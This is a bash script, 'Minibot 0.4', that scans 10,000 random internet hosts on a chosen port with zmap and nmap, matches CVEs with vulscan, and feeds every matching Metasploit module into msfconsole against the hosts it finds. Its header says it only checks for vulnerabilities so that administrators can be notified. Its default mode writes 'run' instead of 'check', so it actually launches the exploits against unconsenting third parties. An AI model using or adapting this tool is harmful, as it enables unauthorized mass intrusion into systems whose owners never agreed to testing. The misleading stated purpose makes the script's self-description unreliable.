#!/bin/bash
# minibot0.4

# Minibot is designed to sweep the internet for vulnerable services by
# checking Metasploit-Framework's exploits without exploiting them in order
# to notify their administrators.

# Help menu
help () {
        echo "Minibot 0.4 - Copyleft("$'\u0254'") 2019 Badbot Corporation. All rigths freed."
        echo "Usage: ./minibot0.4 [OPTION] {port specification}"
        echo "PORT SPECIFICATION"
        echo "  -p <port>"
#       echo           Ex: -p 22; -p 1-65535; -p 53,111,137,21-25,80,139,8080"
	echo "OPTIONS"
        echo "  -d      debugging"
        echo "  -h      show this help"
}

# Normal function do same as debug but transparently for user
normal () {

	banner () {
		clear
		echo " "
		echo "Minibot 0.4 - Copyleft("$'\u0254'") 2019 Badbot Corporation. All rigths freed."
		echo " "
		echo " "
	}

	banner
	echo "	Scanning active hosts..."
	zmap -p $port -n 10000 -b blacklist.txt -o ip-up.txt &> /dev/null
	uphosts=$(wc -l ip-up.txt | cut -d " " -f1)
	banner
	echo "	Active hosts:" $uphosts
	echo " "

	echo "	Scanning unfiltered hosts..."
	nmap -p $port -iL ip-up.txt --open -oG ip-open.tmp &> /dev/null
	cat ip-open.tmp | grep /open/ | cut -d " " -f2 > ip-open.txt
	unfilhosts=$(wc -l ip-open.txt | cut -d " " -f1)

	banner
	echo "	Active hosts:" $uphosts
	echo " "
	echo "	Unfiltered hosts:" $unfilhosts
	echo " "

	echo "	Scanning vulnerable hosts..."
	while read ip; do
                nmap --script vulscan --script-args vulscandb=cve.csv -Pn -n -sV -p $port -T4 $ip | grep -o CVE-....-.... >> targets/$ip:$port
        done <ip-open.txt
	find targets/ -empty -type f -delete
	pvulnhosts=$(ls -1 targets/ | wc -l)

	banner
	echo "	Active hosts:" $uphosts
	echo " "
	echo "	Unfiltered hosts:" $unfilhosts
	echo " "
	echo "	Possibly vulnerable hosts:" $pvulnhosts

	msfconsole -x "search check:yes port:"$port" -o exploits.tmp ;\
			hosts -a $(ls targets/ | cut -d ":" -f1 | sed 's/$/ /') ;\
			exit"
	cat exploits.tmp | tail -n +2 | cut -d "," -f2 | sed 's/"//g' | sed -e 's/^/use /' > exploits.rc
        banner
        echo "	Active hosts:" $uphosts
        echo " "
        echo "	Unfiltered hosts:" $unfilhosts
        echo " "
        echo "	Possibly vulnerable hosts:" $pvulnhosts
	echo " "
	echo "	Checking" $(wc -l exploits.rc | cut -d " " -f1) "exploits for" $(ls targets/ | wc -l) "hosts..."
	cat exploits.tmp | tail -n +2 | cut -d "," -f2 | sed 's/"//g' | sed -e 's/^/use /' | sed G | sed 's/^$/hosts -R\nrun/' > exploits.rc
	echo "hosts -d" >> exploits.rc
	echo "exit" >> exploits.rc
	sed -i '1ispool msf.log' exploits.rc
	msfconsole -r exploits.rc
}

debug () {
	# 1- Search among 10,000 random targets those who have a service on the specified port
	zmap -p $port -n 10000 -b blacklist.txt -o ip-up.txt
	# 2- Discard those that are protected by firewall, IDS/IPS...
	nmap -p $port -iL ip-up.txt --open -oG ip-open.tmp
	cat ip-open.tmp | grep /open/ | cut -d " " -f2 > ip-open.txt
	# 3- Choose those that have a known vulnerability
	while read ip; do
        	nmap --script vulscan --script-args vulscandb=cve.csv -Pn -n -sV -p $port -T4 $ip | grep -o CVE-....-.... >> targets/$ip:$port
	done <ip-open.txt
	find targets/ -empty -type f -delete
	# 4- These targets are checked by MSF's exploits related to this port
	msfconsole -x "search check:yes port:"$port" -o exploits.tmp ;\
                        hosts -a $(ls targets/ | cut -d ":" -f1 | sed 's/$/ /') ;\
                        exit"
	cat exploits.tmp | tail -n +2 | cut -d "," -f2 | sed 's/"//g' | sed -e 's/^/use /' | sed G | sed 's/^$/hosts -R\ncheck/' > exploits.rc
	echo "hosts -d" >> exploits.rc
        echo "exit" >> exploits.rc
	sed -i '1ispool msf.log' exploits.rc
	msfconsole -r exploits.rc

}

cleanup () {
# Save reports
mv targets/* reports/
grep -i "is vulnerable" msf.log >> reports/vuln-hosts.log

# Remove temp files
rm ip-up.txt
rm ip-open.tmp
rm ip-open.txt
rm exploits.tmp
rm exploits.csv
rm exploits.rc
rm msf.log
}

mkdir targets &> /dev/null
mkdir reports &> /dev/null
# Check args
case $1 in
     -p)
        port=$2
        normal
     ;;
     -h)
        help
     ;;
     -d)
        if [[ $2 = "-p" ]];then
                port=$3
                debug
        else
                help
        fi
     ;;
     *)
        help
     ;;
esac

cleanup &> /dev/null

